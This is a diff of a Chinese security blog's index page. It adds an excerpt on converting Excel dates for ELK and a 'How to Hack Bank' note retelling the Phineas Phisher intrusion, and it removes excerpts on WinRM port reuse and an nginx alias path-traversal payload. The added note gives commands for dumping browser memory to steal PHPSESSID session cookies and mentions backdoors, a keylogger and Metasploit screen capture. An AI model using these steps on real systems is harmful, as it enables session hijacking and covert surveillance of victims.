@@ -117,6 +117,182 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/05/06/python-elk.html" >Python处理xlsx到ELK</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-05-06  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
+	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
+	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
+	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
+	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
+	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
+	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/04/22/how-to-hack-bank.html" >How to Hack Bank</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-04-22  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
+</blockquote>
+<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
+strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
+findstr PHPSESSID * .dmp&gt; tmp
+strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
+<li>常用的操作用一个后门</li>
+<li>留一个备用的后门，第一个失效之后启用</li>
+</ol>
+<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
+<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
+post&#x2F;windows&#x2F;gather&#x2F;screen_spy
+
+再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
+
+
+使用Windows自带的PSR截屏：
+psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
+Start-Sleep -s 20;
+psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
+realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
+all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
+living that way. So I began to spend more time away from my computer, with other people, 
+learning to open myself to the world, to feel my emotions, to connect with others, to accept 
+risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
+more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
+my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
+</blockquote>
+<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
+strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
+findstr PHPSESSID * .dmp&gt; tmp
+strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
+<li>常用的操作用一个后门</li>
+<li>留一个备用的后门，第一个失效之后启用</li>
+</ol>
+<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
+<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
+post&#x2F;windows&#x2F;gather&#x2F;screen_spy
+
+再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
+
+
+使用Windows自带的PSR截屏：
+psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
+Start-Sleep -s 20;
+psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
+realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
+all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
+living that way. So I began to spend more time away from my computer, with other people, 
+learning to open myself to the world, to feel my emotions, to connect with others, to accept 
+risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
+more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
+my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/04/13/dpapi-pass-dump.html" >通过DPAPI获取windows身份凭证</a>
 		</h3>
 		</div>
@@ -445,120 +621,6 @@ mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-nu
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/10/23/winrm.html" >winRM端口复用</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-10-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
-<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
-<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
-<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
-winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>连接(默认端口是5985，需要加上去):</p>
-<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
-<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
-<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
-<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
-winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>连接(默认端口是5985，需要加上去):</p>
-<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/09/17/nginx_path_traversle.html" >nginx的目录穿越</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-09-17  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
-<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
-               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
-       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
-<p>代理末尾添加/之后，nginx会先对uri进行normalized处理，使用../读取文件会失败，当没有添加/的时候，nginx会把原请求直接转发给后端服务器，所以可以读取成功。</p>
-
-	
-
-	</div>
-  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
-<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
-               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
-       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
-<p>代理末尾添加/之后，nginx会先对uri进行normalized处理，使用../读取文件会失败，当没有添加/的时候，nginx会把原请求直接转发给后端服务器，所以可以读取成功。</p>
-
-	
-	</div>
-  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -610,7 +672,7 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>3</span></a></li>
+			<li><a href="/categories/Java/">Java<span>5</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -637,6 +699,14 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
+      </li>
+    
+      <li>
+        <a href="/2022/04/06/CVE-2022-22965.html" ><i class="fa fa-file-o"></i>CVE-2022-22965漏洞记录</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
       </li>
     
@@ -646,14 +716,6 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
     
       <li>
         <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
       </li>
     
   </ul>
